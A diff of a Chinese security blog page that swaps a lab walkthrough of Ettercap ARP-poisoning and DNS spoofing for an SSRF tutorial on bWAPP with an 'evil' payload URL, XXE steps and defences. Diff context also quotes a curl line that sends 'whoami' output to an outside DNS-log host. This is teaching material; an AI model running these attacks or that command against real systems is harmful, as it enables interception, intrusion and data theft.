@@ -13,7 +13,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
   <title>
     
-      DNS欺骗 | pidandoufu
+      SSRF原理、操作演示及防御 | pidandoufu
     
   </title>
   <meta name="author" content="pidandoufu">
@@ -160,7 +160,7 @@
 	<!-- Page title -->
 	<p>
 		
-			当前文章&nbsp;:&nbsp;《DNS欺骗》
+			当前文章&nbsp;:&nbsp;《SSRF原理、操作演示及防御》
 		
 	</p>
 
@@ -277,8 +277,8 @@
 	<div class="article-title">
 		<i class="fa fa-paper-plane-o" aria-hidden="true"></i>
 		
-	<a href="/2019/03/31/DNS欺骗/" itemprop="url">
-		DNS欺骗
+	<a href="/2019/05/16/SSRF原理、操作演示及防御/" itemprop="url">
+		SSRF原理、操作演示及防御
 	</a>
 
 	</div>
@@ -291,9 +291,9 @@
 
 	发布于
 
-	<a href="/2019/03/31/DNS欺骗/" itemprop="url">
-		<time datetime="2019-03-31T13:06:58.000Z" itemprop="datePublished">
-	  		2019-03-31
+	<a href="/2019/05/16/SSRF原理、操作演示及防御/" itemprop="url">
+		<time datetime="2019-05-16T10:06:58.000Z" itemprop="datePublished">
+	  		2019-05-16
 	  </time>
 	</a>
 	&nbsp;
@@ -309,9 +309,9 @@
 
 	更新于
 
-	<a href="/2019/03/31/DNS欺骗/" itemprop="url">
-		<time datetime="2019-03-31T13:06:58.000Z" itemprop="dateUpdated">
-	  		2019-05-01
+	<a href="/2019/05/16/SSRF原理、操作演示及防御/" itemprop="url">
+		<time datetime="2019-05-16T10:06:58.000Z" itemprop="dateUpdated">
+	  		2019-05-16
 	  </time>
 	</a> 
 
@@ -322,8 +322,8 @@
 			<i class="fa fa-tags"></i>
 			
 	
-		<a href="/tags/msf/" class=" ">
-			msf
+		<a href="/tags/SSRF漏洞/" class=" ">
+			SSRF漏洞
 		</a>
 	
 		
@@ -332,7 +332,7 @@
 		
 
 	
-    <span class="leancloud_visitors" id="/2019/03/31/DNS欺骗/_visitors" data-url="/2019/03/31/DNS欺骗/" data-title="DNS欺骗">
+    <span class="leancloud_visitors" id="/2019/05/16/SSRF原理、操作演示及防御/_visitors" data-url="/2019/05/16/SSRF原理、操作演示及防御/" data-title="SSRF原理、操作演示及防御">
        	<i class="fa fa-eye"></i>
        	热度
         <i class="leancloud_visitors_count" id="leancloud_visitors_count">0</i>
@@ -342,7 +342,7 @@
 
 
 	
-    <span class="leancloud_likes" id="/2019/03/31/DNS欺骗/_likes" data-url="/2019/03/31/DNS欺骗/" data-title="DNS欺骗" rel="unlike">
+    <span class="leancloud_likes" id="/2019/05/16/SSRF原理、操作演示及防御/_likes" data-url="/2019/05/16/SSRF原理、操作演示及防御/" data-title="SSRF原理、操作演示及防御" rel="unlike">
         <i class="fa fa-heart"></i>
         喜欢
         <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
@@ -351,30 +351,22 @@
 	</div>
 
 	<div class="article-content" id="article-content">
-		<h1 id="实战DNS欺骗"><a href="#实战DNS欺骗" class="headerlink" title=" 实战DNS欺骗"></a><strong> 实战DNS欺骗</strong></h1><a id="more"></a>
-<h4 id="DNS（Domain-Name-System，域名系统）欺骗："><a href="#DNS（Domain-Name-System，域名系统）欺骗：" class="headerlink" title="DNS（Domain Name System，域名系统）欺骗："></a>DNS（Domain Name System，域名系统）欺骗：</h4><p>DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。 原理：如果可以冒充域名服务器，然后把查询的IP地址设为攻击者的IP地址，这样的话，用户上网就只能看到攻击者的主页，而不是用户想要取得的网站的主页了，这就是DNS欺骗的基本原理。</p>
-<p><img src="/img/100.png" alt></p>
-<h5 id="在kali-linux终端输入-ifconfig查看ip地址"><a href="#在kali-linux终端输入-ifconfig查看ip地址" class="headerlink" title="在kali linux终端输入 ifconfig查看ip地址"></a>在kali linux终端输入 ifconfig查看ip地址</h5><p>-——————– </p>
-<p><img src="/img/101.png" alt="img"></p>
-<h5 id="主机：192-168-113-129"><a href="#主机：192-168-113-129" class="headerlink" title="主机：192.168.113.129"></a>主机：192.168.113.129</h5><h5 id="要攻击的主机：192-168-113-131"><a href="#要攻击的主机：192-168-113-131" class="headerlink" title="要攻击的主机：192.168.113.131"></a>要攻击的主机：192.168.113.131</h5><h5 id="打开Ettercap"><a href="#打开Ettercap" class="headerlink" title="打开Ettercap"></a>打开Ettercap</h5><h5 id="利用locate找到文件的位置"><a href="#利用locate找到文件的位置" class="headerlink" title="利用locate找到文件的位置"></a>利用locate找到文件的位置</h5><h5 id="Locate-etter-conf"><a href="#Locate-etter-conf" class="headerlink" title="Locate etter.conf"></a>Locate etter.conf</h5><h5 id="文本编辑etter-conf"><a href="#文本编辑etter-conf" class="headerlink" title="文本编辑etter.conf"></a>文本编辑etter.conf</h5><h5 id="gedit-etc-ettercap-etter-conf，"><a href="#gedit-etc-ettercap-etter-conf，" class="headerlink" title="gedit /etc/ettercap/etter.conf，"></a>gedit /etc/ettercap/etter.conf，</h5><p><img src="/img/102.png" alt="img"></p>
-<h5 id="这里的参数设成0"><a href="#这里的参数设成0" class="headerlink" title="这里的参数设成0"></a>这里的参数设成0</h5><p><img src="/img/103.png" alt="img"></p>
-<h5 id="去掉前面的-，也叫作哈希标识-打开Iptables"><a href="#去掉前面的-，也叫作哈希标识-打开Iptables" class="headerlink" title="去掉前面的#，也叫作哈希标识,打开Iptables"></a>去掉前面的#，也叫作哈希标识,打开Iptables</h5><p><img src="/img/104.png" alt="img"></p>
-<h5 id="打开ettercap，首先scan-forhosts然后打开host-list"><a href="#打开ettercap，首先scan-forhosts然后打开host-list" class="headerlink" title="打开ettercap，首先scan forhosts然后打开host list"></a>打开ettercap，首先scan forhosts然后打开host list</h5><p><img src="/img/105.png" alt="img"></p>
-<h5 id="将192-168-113-2设为target2-192-168-113-131设为target1"><a href="#将192-168-113-2设为target2-192-168-113-131设为target1" class="headerlink" title="将192.168.113.2设为target2,192.168.113.131设为target1"></a>将192.168.113.2设为target2,192.168.113.131设为target1</h5><h5 id="这里的192-168-113-2是网关，可以用route-n查看"><a href="#这里的192-168-113-2是网关，可以用route-n查看" class="headerlink" title="这里的192.168.113.2是网关，可以用route -n查看"></a>这里的192.168.113.2是网关，可以用route -n查看</h5><p><img src="/img/106.png" alt="img"></p>
-<p><img src="/img/107.png" alt="img"></p>
-<h5 id="然后我们转到中间人攻击的选项"><a href="#然后我们转到中间人攻击的选项" class="headerlink" title="然后我们转到中间人攻击的选项"></a>然后我们转到中间人攻击的选项</h5><h5 id="选择ARP毒化mitm–ARP-Poisoning–sniff-remote-connections"><a href="#选择ARP毒化mitm–ARP-Poisoning–sniff-remote-connections" class="headerlink" title="选择ARP毒化mitm–ARP Poisoning–sniff remote connections"></a>选择ARP毒化mitm–ARP Poisoning–sniff remote connections</h5><h5 id="用于攻击个人以及企业的最常见的网络攻击方式就是中间人攻击-MITM-。作为一种主动窃听攻击方式，中间人攻击方式主要是通过与目标机器建立连接并在目标机器间传递信息来发动攻击。在这种情况下，用户会认为自己正在与另一名用户直接通信，而实际上，通过主机的通信流量正在对用户执行攻击。最终结果是，攻击主机不仅能截取重要信息，而且能够注入数据流来进一步控制受害用户。"><a href="#用于攻击个人以及企业的最常见的网络攻击方式就是中间人攻击-MITM-。作为一种主动窃听攻击方式，中间人攻击方式主要是通过与目标机器建立连接并在目标机器间传递信息来发动攻击。在这种情况下，用户会认为自己正在与另一名用户直接通信，而实际上，通过主机的通信流量正在对用户执行攻击。最终结果是，攻击主机不仅能截取重要信息，而且能够注入数据流来进一步控制受害用户。" class="headerlink" title="用于攻击个人以及企业的最常见的网络攻击方式就是中间人攻击(MITM)。作为一种主动窃听攻击方式，中间人攻击方式主要是通过与目标机器建立连接并在目标机器间传递信息来发动攻击。在这种情况下，用户会认为自己正在与另一名用户直接通信，而实际上，通过主机的通信流量正在对用户执行攻击。最终结果是，攻击主机不仅能截取重要信息，而且能够注入数据流来进一步控制受害用户。"></a>用于攻击个人以及企业的最常见的网络攻击方式就是中间人攻击(MITM)。作为一种主动窃听攻击方式，中间人攻击方式主要是通过与目标机器建立连接并在目标机器间传递信息来发动攻击。在这种情况下，用户会认为自己正在与另一名用户直接通信，而实际上，通过主机的通信流量正在对用户执行攻击。最终结果是，攻击主机不仅能截取重要信息，而且能够注入数据流来进一步控制受害用户。</h5><p>-——————– </p>
-<p><img src="/img/108.png" alt="img"></p>
-<h5 id="打开plugins-点击DNS欺骗插件dns-sproof来激活它"><a href="#打开plugins-点击DNS欺骗插件dns-sproof来激活它" class="headerlink" title="打开plugins 点击DNS欺骗插件dns_sproof来激活它"></a>打开plugins 点击DNS欺骗插件dns_sproof来激活它</h5><p><img src="/img/109.png" alt="img"></p>
-<h5 id="然后进入文本编辑修改etter-dns"><a href="#然后进入文本编辑修改etter-dns" class="headerlink" title="然后进入文本编辑修改etter.dns"></a>然后进入文本编辑修改etter.dns</h5><h5 id="终端命令：gedit-etc-ettercap-etter-dns"><a href="#终端命令：gedit-etc-ettercap-etter-dns" class="headerlink" title="终端命令：gedit /etc/ettercap/etter.dns"></a>终端命令：gedit /etc/ettercap/etter.dns</h5><p><img src="/img/111.png" alt="img"></p>
-<h5 id="接着跳转到"><a href="#接着跳转到" class="headerlink" title="接着跳转到"></a>接着跳转到</h5><h5 id="var文件夹-www文件夹-然后是html文件夹"><a href="#var文件夹-www文件夹-然后是html文件夹" class="headerlink" title="var文件夹 www文件夹 然后是html文件夹"></a>var文件夹 www文件夹 然后是html文件夹</h5><h5 id="index-html打开是这样的，我们现在选择文本编辑它"><a href="#index-html打开是这样的，我们现在选择文本编辑它" class="headerlink" title="index.html打开是这样的，我们现在选择文本编辑它"></a>index.html打开是这样的，我们现在选择文本编辑它</h5><p><img src="/img/112.png" alt="img"></p>
-<p><img src="/img/113.png" alt="img"></p>
-<p><img src="/img/114.png" alt="img"></p>
-<h5 id="开启apache服务器，这样我们的机子就变成网页服务器了"><a href="#开启apache服务器，这样我们的机子就变成网页服务器了" class="headerlink" title="开启apache服务器，这样我们的机子就变成网页服务器了"></a>开启apache服务器，这样我们的机子就变成网页服务器了</h5><p>命令：service apache2 start</p>
-<p><img src="/img/115.png" alt="img"></p>
-<p>接下来，在目标主机centos上输入KAIL的IP地址</p>
-<p><img src="/img/116.png" alt="img"></p>
-<h5 id="我们可以在ettercap看到，microsoft-com被定位到168-192-113-129"><a href="#我们可以在ettercap看到，microsoft-com被定位到168-192-113-129" class="headerlink" title="我们可以在ettercap看到，microsoft.com被定位到168.192.113.129"></a>我们可以在ettercap看到，microsoft.com被定位到168.192.113.129</h5><p><img src="/img/117.png" alt="img"></p>
-	
+		<h2 id="SSRF漏洞："><a href="#SSRF漏洞：" class="headerlink" title="SSRF漏洞："></a>SSRF漏洞：</h2><h4 id="SSRF-Server-Side-Request-Forgery-服务器端请求伪造-是一种由恶意访问者构造形成由服务端发起请求的一个安全漏洞。"><a href="#SSRF-Server-Side-Request-Forgery-服务器端请求伪造-是一种由恶意访问者构造形成由服务端发起请求的一个安全漏洞。" class="headerlink" title="SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由恶意访问者构造形成由服务端发起请求的一个安全漏洞。"></a>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由恶意访问者构造形成由服务端发起请求的一个安全漏洞。</h4><h4 id="一般情况下，SSRF访问的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）SSRF-形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。"><a href="#一般情况下，SSRF访问的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）SSRF-形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。" class="headerlink" title="一般情况下，SSRF访问的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。"></a>一般情况下，SSRF访问的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</h4><h4 id="比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。"><a href="#比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。" class="headerlink" title="比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。"></a>比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</h4><h4 id="1-SSRF漏洞就是通过篡改获取资源请求发送给服务器，"><a href="#1-SSRF漏洞就是通过篡改获取资源请求发送给服务器，" class="headerlink" title="1.SSRF漏洞就是通过篡改获取资源请求发送给服务器，"></a>1.SSRF漏洞就是通过篡改获取资源请求发送给服务器，</h4><h4 id="2-但是服务器并没有发现在这个请求是合法的"><a href="#2-但是服务器并没有发现在这个请求是合法的" class="headerlink" title="2.但是服务器并没有发现在这个请求是合法的"></a>2.但是服务器并没有发现在这个请求是合法的</h4><h4 id="3-然后服务器以他的身份来访问其他服务器的资源"><a href="#3-然后服务器以他的身份来访问其他服务器的资源" class="headerlink" title="3.然后服务器以他的身份来访问其他服务器的资源"></a>3.然后服务器以他的身份来访问其他服务器的资源</h4><h3 id="SSRF的作用："><a href="#SSRF的作用：" class="headerlink" title="SSRF的作用："></a>SSRF的作用：</h3><ul>
+<li><h4 id="扫描内网网络"><a href="#扫描内网网络" class="headerlink" title="扫描内网网络"></a>扫描内网网络</h4></li>
+<li><h4 id="向内内部的任意主机的任意端口发送惊醒构造的数据包"><a href="#向内内部的任意主机的任意端口发送惊醒构造的数据包" class="headerlink" title="向内内部的任意主机的任意端口发送惊醒构造的数据包"></a>向内内部的任意主机的任意端口发送惊醒构造的数据包</h4></li>
+<li><h4 id="DOS-请求大文件，始终保持连接"><a href="#DOS-请求大文件，始终保持连接" class="headerlink" title="DOS(请求大文件，始终保持连接)"></a>DOS(请求大文件，始终保持连接)</h4></li>
+<li><h4 id="暴力穷举（users-dirs-files）"><a href="#暴力穷举（users-dirs-files）" class="headerlink" title="暴力穷举（users/dirs/files）"></a>暴力穷举（users/dirs/files）</h4></li>
+</ul>
+<p><img src="/img/sssrf.png" alt="894412-20160910112127848-1995894242"></p>
+<h4 id="下面是简单SSRF-RFL和SSRF-XEE的简单演示。（操作环境为bWAPP）"><a href="#下面是简单SSRF-RFL和SSRF-XEE的简单演示。（操作环境为bWAPP）" class="headerlink" title="下面是简单SSRF-RFL和SSRF-XEE的简单演示。（操作环境为bWAPP）:"></a>下面是简单SSRF-RFL和SSRF-XEE的简单演示。（操作环境为bWAPP）:</h4><h4 id="首先打开我们的SSRF模块"><a href="#首先打开我们的SSRF模块" class="headerlink" title="首先打开我们的SSRF模块"></a>首先打开我们的SSRF模块</h4><p><img src="/img/1558002416474.png" alt="1558002416474"></p>
+<h4 id="然后看到这模块低下有Port-scan（RFI）和Access-XEE-模块，点击Port-scan，获取exp的ip地址："><a href="#然后看到这模块低下有Port-scan（RFI）和Access-XEE-模块，点击Port-scan，获取exp的ip地址：" class="headerlink" title="然后看到这模块低下有Port scan（RFI）和Access(XEE)模块，点击Port scan，获取exp的ip地址："></a>然后看到这模块低下有Port scan（RFI）和Access(XEE)模块，点击Port scan，获取exp的ip地址：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.6.241/evil/ssrf-1.txt</span><br></pre></td></tr></table></figure>
+<h4 id="然后打开RFI的模块，如图"><a href="#然后打开RFI的模块，如图" class="headerlink" title="然后打开RFI的模块，如图"></a>然后打开RFI的模块，如图</h4><p><img src="/img/1558002638082.png" alt="1558002638082"></p>
+<h4 id="然后把exp的IP-地址写到language-的后面，POST一个内网的IP-地址，可以看到这个地址开启的端口，如下："><a href="#然后把exp的IP-地址写到language-的后面，POST一个内网的IP-地址，可以看到这个地址开启的端口，如下：" class="headerlink" title="然后把exp的IP 地址写到language=的后面，POST一个内网的IP 地址，可以看到这个地址开启的端口，如下："></a>然后把exp的IP 地址写到language=的后面，POST一个内网的IP 地址，可以看到这个地址开启的端口，如下：</h4><p><img src="/img/1558002852215.png" alt="1558002852215"></p>
+<h4 id="然后是SSRF-XEE的演示，如下-，点击Access的获取payload，如下"><a href="#然后是SSRF-XEE的演示，如下-，点击Access的获取payload，如下" class="headerlink" title="然后是SSRF-XEE的演示，如下 ，点击Access的获取payload，如下"></a>然后是SSRF-XEE的演示，如下 ，点击Access的获取payload，如下</h4><p><img src="/img/1558003505441.png" alt="1558003505441"></p>
+<h4 id="然后切换到XEE模块，拦截数据包"><a href="#然后切换到XEE模块，拦截数据包" class="headerlink" title="然后切换到XEE模块，拦截数据包"></a>然后切换到XEE模块，拦截数据包</h4><p><img src="/img/1558003833905.png" alt="1558003833905"></p>
+<h4 id="然后写入XEE"><a href="#然后写入XEE" class="headerlink" title="然后写入XEE"></a>然后写入XEE</h4><p><img src="/img/1558003897002.png" alt="1558003897002"></p>
+<h4 id="读取页面信息的XEE"><a href="#读取页面信息的XEE" class="headerlink" title="读取页面信息的XEE"></a>读取页面信息的XEE</h4><p><img src="/img/1558004003309.png" alt="1558004003309"></p>
+<h2 id="防御SSRF"><a href="#防御SSRF" class="headerlink" title="防御SSRF"></a>防御SSRF</h2><h4 id="1-过滤返回信息，验证远程服务器对请求的响应是比较容易的方法；"><a href="#1-过滤返回信息，验证远程服务器对请求的响应是比较容易的方法；" class="headerlink" title="1.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法；"></a>1.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法；</h4><h4 id="2-统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态"><a href="#2-统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态" class="headerlink" title="2.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态"></a>2.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态</h4><h4 id="3-限制请求的端口为http常用的端口，比如-80-443-8080-8090"><a href="#3-限制请求的端口为http常用的端口，比如-80-443-8080-8090" class="headerlink" title="3.限制请求的端口为http常用的端口，比如.80,443,8080,8090"></a>3.限制请求的端口为http常用的端口，比如.80,443,8080,8090</h4><h4 id="4-黑名单内网IP-避免应用被用来获取内网数据，攻击内网；"><a href="#4-黑名单内网IP-避免应用被用来获取内网数据，攻击内网；" class="headerlink" title="4.黑名单内网IP.避免应用被用来获取内网数据，攻击内网；"></a>4.黑名单内网IP.避免应用被用来获取内网数据，攻击内网；</h4><h4 id="5-禁用不需要的协议。仅允许http和https请求；"><a href="#5-禁用不需要的协议。仅允许http和https请求；" class="headerlink" title="5.禁用不需要的协议。仅允许http和https请求；"></a>5.禁用不需要的协议。仅允许http和https请求；</h4><h4 id="6-使用正则对参数进行效验，防止畸形请求染过黑名单。"><a href="#6-使用正则对参数进行效验，防止畸形请求染过黑名单。" class="headerlink" title="6.使用正则对参数进行效验，防止畸形请求染过黑名单。"></a>6.使用正则对参数进行效验，防止畸形请求染过黑名单。</h4>	
 	</div>
 	
 	<div id="current-post-cover" data-scr="/img/cart_cover.jpg"></div>
@@ -392,12 +384,8 @@
 	<span>
 		<a href="javascript: window.scrollTo(0, 0);">返回顶部</a>
 		
-			<a href="/2019/04/01/状态码/" title="状态码" rel="prev">
-				&laquo;上一篇
-			</a>
 		
-		
-			<a href="/2019/03/31/Php-mysql-html简单留言板制作/" title="Php+mysql+html简单留言板制作" rel="next">
+			<a href="/2019/05/09/CSRF原理及演示/" title="CSRF原理及演示" rel="next">
 				下一篇&raquo;
 			</a>
 			
@@ -415,88 +403,6 @@
 <div class="relate-post">
 	
 		<ul>
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2019/03/17/利用msf生成木马入侵电脑/" title="利用msf生成木马入侵电脑">
-								利用msf生成木马入侵电脑			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								三月 17日, 2019				
-							</p>
-							<p class="relate-post-content">
-								介绍：Metasploit (MSF)综合利用工具，集成上千种漏洞利用方式，操作简单易上手。Kali自带的，依赖于postgresql数据库
-
-
-[ ] 利用msf生成木马
-
-[ ] 投放木马至目标机
-
-[ ] 监听
-
-[ ] 控制，...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2019/03/17/利用msf生成木马入侵电脑/" title="利用msf生成木马入侵电脑">				
-								
-								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="利用msf生成木马入侵电脑">
-							</a>
-						</div>
-					</li>											
-			
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2019/04/08/msf浏览器自动攻击/" title="msf浏览器自动攻击">
-								msf浏览器自动攻击			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								四月 8日, 2019				
-							</p>
-							<p class="relate-post-content">
-								msf浏览器自动攻击
-首先查看数据库状态 ，并启动数据库12/etc/init.d/postgresql status/etc/init.d/postgresql start
-
-打开msf:1msfconsole
-搜索我们需要的浏览器...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2019/04/08/msf浏览器自动攻击/" title="msf浏览器自动攻击">				
-								
-								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="msf浏览器自动攻击">
-							</a>
-						</div>
-					</li>											
-			
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2019/05/16/SSRF原理、操作演示及防御/" title="SSRF原理、操作演示及防御">
-								SSRF原理、操作演示及防御			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								五月 16日, 2019				
-							</p>
-							<p class="relate-post-content">
-								SSRF漏洞：SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由恶意访问者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF访问的目标是从外网无法访问的内部系统。（正是因为它是由服...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2019/05/16/SSRF原理、操作演示及防御/" title="SSRF原理、操作演示及防御">				
-								
-								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="SSRF原理、操作演示及防御">
-							</a>
-						</div>
-					</li>											
-			
 			
 					<li>
 						<div class="relate-post-text">
@@ -678,6 +584,97 @@ i. *nix:12curl http://ip.port.b182oj.ceye.io/`whoami`ping `whoami`.ip.port.b182o
 							<a href="/2019/04/15/DNSLOG在盲注中的使用/" title="DNSLOG在盲注中的使用">				
 								
 								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="DNSLOG在盲注中的使用">
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/04/14/sql注入-二/" title="sql注入(二)">
+								sql注入(二)			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 14日, 2019				
+							</p>
+							<p class="relate-post-content">
+								报错注入、​     报错函数（举例）  
+​            （1）extractvalue(参数1，参数2)
+​                          从目标XML中返回查询的字符串，参数1  是string格式...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/04/14/sql注入-二/" title="sql注入(二)">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="sql注入(二)">
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/04/11/sql注入/" title="sql注入(一)">
+								sql注入(一)			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 11日, 2019				
+							</p>
+							<p class="relate-post-content">
+								sql注入漏洞，主要介绍有以下几种
+
+
+5.0mysql数据库特性
+
+手工注入一般步骤
+
+常用的万能密码
+
+联和注入
+
+基于布尔的盲注
+
+基于时间的盲注
+
+5.0mysql数据库特性information _schema
+自带，系统库...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/04/11/sql注入/" title="sql注入(一)">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="sql注入(一)">
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/04/08/msf浏览器自动攻击/" title="msf浏览器自动攻击">
+								msf浏览器自动攻击			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 8日, 2019				
+							</p>
+							<p class="relate-post-content">
+								msf浏览器自动攻击
+首先查看数据库状态 ，并启动数据库12/etc/init.d/postgresql status/etc/init.d/postgresql start
+
+打开msf:1msfconsole
+搜索我们需要的浏览器...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/04/08/msf浏览器自动攻击/" title="msf浏览器自动攻击">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="msf浏览器自动攻击">
 							</a>
 						</div>
 					</li>											
